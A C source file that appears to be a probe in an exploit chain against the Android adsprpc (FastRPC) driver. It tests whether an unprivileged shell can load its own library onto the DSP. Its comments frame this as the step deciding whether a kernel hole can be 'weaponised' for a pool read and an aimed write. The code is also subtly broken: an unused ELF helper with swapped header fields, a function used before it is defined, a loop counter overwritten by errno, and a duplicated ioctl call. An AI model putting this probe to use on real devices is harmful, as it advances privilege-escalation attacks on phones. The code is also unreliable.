#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* Does FASTRPC_IOCTL_INIT(_CREATE) accept a caller-supplied library from an
 * unprivileged shell fd?  The HLOS side has no signature check and no capability check
 * (adsprpc.c:1326+ just mmaps what we hand it and calls the DSP), so this probe measures
 * the ONE thing that decides whether the adsprpc hole is weaponisable:
 *   - if CREATE succeeds, we get a handle whose METHODS WE define, i.e. a DSP service
 *     that will accept whatever scalar shape we build => the contained-overlap call can
 *     be made to succeed => put_args runs => we get both the pool read and, next step,
 *     the aimed write.
 *   - if it fails, the only accepted legacy signatures (in=1/out=1, non-overlapping) stay
 *     in force, the overlapped call always errors out before put_args, and the write is
 *     unobservable => treat adsprpc as closed for our purposes.
 *
 * Both arg flavours are tried, because the struct allows an ion fd or a plain user VA:
 *   (a) filefd = -1, file = our page           (user-pointer style)
 *   (b) filefd = an ION share fd (DMA-BUF)     (what real clients use)
 * A failure of the ADSP side shows up as a subsystem restart, not a kernel panic, so this
 * probe cannot cost a power cycle.
 */
typedef struct { void *pv; ssize_t len; } remote_buf_t;
typedef union { remote_buf_t buf; uint32_t h; } remote_arg_t;
#define IOCW(n, sz) (unsigned long)((3u << 30) | ((sz) << 16) | ((unsigned long)'R' << 8) | (n))
struct ioctl_init { uint32_t flags, pad; uintptr_t file; int32_t filelen, filefd;
                    uintptr_t mem; int32_t memlen, memfd; };
struct ioctl_invoke { uint32_t handle; uint32_t sc; remote_arg_t *pra; };
struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };
struct fd_data { unsigned handle; int fd; };
#define ION_ALLOC  0xc0204900u
#define ION_SHARE  0xc0084904u
#define FASTRPC_INIT_CREATE 1

/* minimal, structurally sane Hexagon shared-object header (EM_HEXAGON = 164) */
static void fake_elf(unsigned char *p)
{
    uint16_t v;
    memset(p, 0, 0x1000);
    memcpy(p, "\x7f" "ELF", 4);
    p[4] = 1;              /* ELFCLASS32: the DSP is 32-bit Hexagon */
    p[5] = 1;              /* data little endian */
    p[6] = 1;              /* EV_CURRENT */
    v = htole16(164);      memcpy(p + 16, &v, 2);   /* e_type = ET_DYN */
    v = htole16(3);        memcpy(p + 18, &v, 2);   /* e_machine? (offset 18 = e_machine) */
}
static uint16_t htole16v(uint16_t x) { return x; }

int main(void)
{
    struct ioctl_init in;
    struct alloc_data ad;
    struct fd_data sd;
    unsigned char *lib;
    int ionfd, afd = -1, fd, i;

    setvbuf(stdout, NULL, _IONBF, 0);
    lib = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(lib, 0, 0x8000);
    memcpy(lib, "\x7f" "ELF\x01\x01\x01", 8);
    lib[16] = 3; lib[17] = 0;          /* e_type = ET_DYN */
    lib[18] = 164; lib[19] = 0;        /* e_machine = EM_HEXAGON */

    fd = open("/dev/adsprpc-smd", O_RDONLY);
    printf("open adsprpc -> %d\n", fd);
    if (fd < 0)
        return 2;
    ioctl(fd, IOCW(5, 4), (unsigned long)0);

    /* an ion DMA-BUF fd, in case CREATE insists on one (shell may allocate + share) */
    ionfd = open("/dev/ion", O_RDONLY);
    if (ionfd >= 0) {
        memset(&ad, 0, sizeof ad);
        ad.len = 0x8000; ad.align = 4096; ad.mask = 1u << 9;
        errno = 0;
        i = ioctl(ionfd, ION_ALLOC, &ad);
        printf("ION_ALLOC rc=%d errno=%d handle=%u\n", i, errno, ad.handle);
        if (!i) {
            memset(&sd, 0, sizeof sd);
            sd.handle = ad.handle;
            errno = 0;
            if (!ioctl(ionfd, ION_SHARE, &sd))
                afd = sd.fd;
            printf("ION_SHARE fd=%d errno=%d\n", afd, errno);
        }
    }

    for (i = 0; i < 2; i++) {
        memset(&in, 0, sizeof in);
        in.flags = FASTRPC_INIT_CREATE;
        if (i == 0) {
            in.file = (uintptr_t)lib; in.filelen = 0x1000; in.filefd = -1;
            in.mem = 0; in.memlen = 0; in.memfd = -1;
            printf("INIT_CREATE via user pointer: ");
        } else {
            in.file = (uintptr_t)lib; in.filelen = 0x1000; in.filefd = afd;
            in.mem = (uintptr_t)lib + 0x4000; in.memlen = 0x4000; in.memfd = afd;
            printf("INIT_CREATE via ion fd       : ");
        }
        fflush(stdout);
        errno = 0;
        i = ioctl(fd, IOCW(6, sizeof in), &in) , i = errno;
        printf("rc=%d errno=%d (%s)\n", ioctl(fd, IOCW(6, sizeof in), &in), i, strerror(i));
    }
    if (ionfd >= 0)
        close(ionfd);
    close(fd);
    return 0;
}
